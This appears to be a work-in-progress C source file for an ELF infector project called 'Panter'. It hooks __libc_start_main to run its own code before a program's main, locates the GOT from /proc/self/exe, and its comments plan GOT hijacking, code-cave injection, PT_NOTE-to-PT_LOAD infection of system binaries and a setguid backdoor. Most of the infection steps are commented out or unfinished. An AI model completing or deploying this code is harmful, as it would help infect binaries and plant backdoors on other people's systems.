
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <time.h>
#include <stdint.h>

#ifndef _ELF_HELPER
#include "../../includes/elf.h"
#endif

#ifndef _LAYOUT_MAPPING
#include "../../includes/layout_mapping.h"
#endif



#define STRICTLY_CHECK_MAGIC_BYTES	// works with DEBUG
#define TARGET "/proc/self/exe"

static int (*orig_main) (int, char **, char **);
// NOTE: __libc_start_main/OR hook_main runs twice in gdb (gef)




typedef int (*__libc_start_main_t)(	int (*main) (int, char * *, char * *),
						int argc,
						char * * ubp_av,
						void (*init) (void),
						void (*fini) (void),
						void (*rtld_fini) (void),
						void (* stack_end));

// Replacement for main, then return real main
int hook_main (int argc, char **argv, char ** envp) 
// int __hooked_entry(	int (*main) (int, char * *, char * *),
// 						int argc,
// 						char * * ubp_av,
// 						void (*init) (void),
// 						void (*fini) (void),
// 						void (*rtld_fini) (void),
// 						void (* stack_end))
{
	printf("~===~ [Panter] ~===~\n");
	uintptr_t got_addr;
	// LOAD /proc/self/exe into mmap
	// locate prinf@plt	- replace printf addr with vdso - our func
	// locate vdso AFTER - 32 - 0xf7000000 | 64 - 0x7ffff70000 (roughly) - RX - size 32 - 0x2000 | 64 - 0x2000
	// locate symbols, inject into a code cave

	//		won't it fuck up the execution because it's "moving" while it's being parsed
	struct elf_struct self_elf;
	error_t err = new_load_elf(TARGET, &self_elf);
	if (err.num != 1) {
		// Maybe someone is reading it?
		goto ret;
	}
	#ifdef STRICTLY_CHECK_MAGIC_BYTES
	if (check_elf_magic(&self_elf) == -1) {
			DEBUG("[-] No ELF bytes \n");
			goto ret;
	}
	#endif


// 0x55555557fc90 HEXDUMP STARTS AT
// FOUND GOT 0x23c90
// ME - WITH GEF GOT 0x00023fe8	0x55555557ffe8
// ME - MINUS 0x0008000			0x555555577fe8
	// Dummy dummy, did it with the wrong BIN
// ls
// GEF GOT 						0x555555577fe8
// maintainance					0x555555577fe8		0x00023fe8
// First one at 				0x555555578000
	// I got 0x7bfe8	WANT 0x77fe8

// With modified (at /usr/bin/ls*) it is 0x4000 2 PAGES off, (need to make -0x4000s)


// this one file, just PT_LOAD injects the self, LD_LIBRARY is at 0x7ffff7, can't get rip
// need to PT_NOTE -> PT_LOAD inject to be in the bin 0x55555555


//	Find Where is dynamic, then add GOT offset, (as a replacement from addr of main + GOT offset)7
// Wrong way of doing it in get_got_addr
// some stuff doesn't have main, maybe not even _start if it removes it when __libc_start_main starts
	process_phdrs(&self_elf);
	process_sections(&self_elf);
	if (self_elf.dyn.dynsym_tab != NULL) {
		got_addr = get_got_addr(&self_elf);
		if (got_addr == 0) {
			DEBUG("[-] GOT couldn't be found\n");
			goto ret;
		}		// it is offset, 
		DEBUG("GOT @0x%p\n", (void *)got_addr);
	}

	get_rela_plt_offsets(&self_elf);

	// I have located GOT independently of ASLR


	if (self_elf.sec.parts.got_plt.sh_size != 0) {
		DEBUG("have .got.plt [PLT]\n");
		// infect_got_plt();
		// goto ret;
	}
	puts("\n\n\nHEYHEYEHEYHEYEYE\n\n\n\n");
	printf("0x%lx ORIG_MAIN | GOT_ADDR 0x%lx\n\n", (uintptr_t)orig_main, got_addr);
	find_base((uintptr_t)orig_main, &self_elf, got_addr);
	// for (int i = 0; i < 50; i++) {
	// 	DEBUG("SYMBOL NAME: %s, OFFSET: %p\n", (char *)self_elf.dyn.symbols[i].name, self_elf.dyn.symbols[i].offset);
	// }
	puts("HEY!\n");

	// setguid backdoor
	// fcntl(0, 0);
	// exit(10);
	ret:
		if (self_elf.fd != -1)
			close(self_elf.fd);

		free(self_elf.dyn.symbols);
// exit(0);
		// typeof(&__hooked_entry) orig__libc_start_main = dlsym(RTLD_NEXT, "__libc_start_main");
puts("BYEBYEBYE\n\n");
// printf("dlsym &%lx\n", (unsigned long)orig__libc_start_main);
		// return orig__libc_start_main(main, argc, ubp_av, init, fini, rtld_fini, stack_end);

		return orig_main(argc, argv, envp);
}

#ifndef PANTER_SEPARATE
int __libc_start_main(__libc_start_main_t lbsm,
						int (*main) (int, char * *, char * *),
						int argc,
						char * * ubp_av,
						void (*init) (void),
						void (*fini) (void),
						void (*rtld_fini) (void),
						void (* stack_end))
#else
int __libc_start_main(int (*main) (int, char * *, char * *),
						int argc,
						char * * ubp_av,
						void (*init) (void),
						void (*fini) (void),
						void (*rtld_fini) (void),
						void (* stack_end))
#endif
{	
	// THERE IS NOT RTLD_NEXT __libc_start_main, -
	__libc_start_main_t orig__libc_start_main;
	#ifndef PANTER_SEPARATE
		orig__libc_start_main = lbsm;
	#else
		orig__libc_start_main = dlsym(RTLD_NEXT, "__libc_start_main");
	#endif

	orig_main = main;

	return orig__libc_start_main(hook_main, argc, ubp_av, init, fini, rtld_fini, stack_end);
}

void HELL_ME() {
	asm("syscall" : : "a"(0x3c), "D"(-1));
}